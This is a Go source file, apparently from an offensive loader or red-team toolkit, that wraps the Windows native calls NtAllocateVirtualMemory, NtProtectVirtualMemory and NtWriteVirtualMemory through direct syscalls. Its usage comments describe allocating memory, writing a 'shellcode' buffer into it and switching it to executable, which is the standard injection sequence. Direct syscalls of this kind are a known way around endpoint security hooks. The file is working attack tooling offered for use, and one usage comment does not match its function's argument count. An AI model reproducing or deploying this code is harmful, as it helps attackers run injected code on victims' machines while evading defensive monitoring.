package core

import (
  "errors"
  "unsafe"
)

// addr, err := VirtualAlloc(pHandle, 0, uintptr(len(shellcode)), windows.MEM_COMMIT | windows.MEM_RESERVE, windows.PAGE_READWRITE)
func VirtualAlloc(handle uintptr, zero uintptr, regionsize uintptr, allocType uintptr, allocProtection uintptr) (uintptr, error) {

  // Get syscall
  sysId, err := GetSysId("NtAllocateVirtualMemory")
  if err != nil {
    return 0, err
  }

  var baseA uintptr
  r, _ := Syscall(
    sysId,
    handle,
    uintptr(unsafe.Pointer(&baseA)),
    zero,
    uintptr(unsafe.Pointer(&regionsize)),
    allocType,
    allocProtection,
  )

  if (r != 0) {
    return 0, errors.New("NtAllocateVirtualMemory syscall returned non-zero error code")
  }

  return baseA, nil
}

// err := VirtualProtect(pHandle, &addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
func VirtualProtect(pHandle uintptr, addr uintptr, regionsize uintptr, newProtect uintptr, oldProtect uintptr) (error) {

  // Get syscall
  sysId, err := GetSysId("NtProtectVirtualMemory")
  if err != nil {
    return err
  }

  r, _ := Syscall(
    sysId,
    pHandle,
    uintptr(unsafe.Pointer(&addr)),
    uintptr(unsafe.Pointer(&regionsize)),
    newProtect,
    oldProtect,
  )

  if (r != 0) {
    return errors.New("NtProtectVirtualMemory syscall returned non-zero error code")
  }

  return nil
}

// err := WriteProcessMemory(pHandle, addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
func WriteProcessMemory(pHandle uintptr, addr uintptr, buffer uintptr, buffer_len uintptr, num_bytes uintptr) (error) {

  // Get syscall
  sysId, err := GetSysId("NtWriteVirtualMemory")
  if err != nil {
    return err
  }

  r, err := Syscall(
    sysId,
    uintptr(pHandle),
    uintptr(addr),
    uintptr(buffer),
    uintptr(buffer_len),
    uintptr(num_bytes),
  )

  if (r != 0) || (err != nil) {
    return errors.New("NtWriteVirtualMemory syscall returned non-zero error code")
  }

  return nil
}


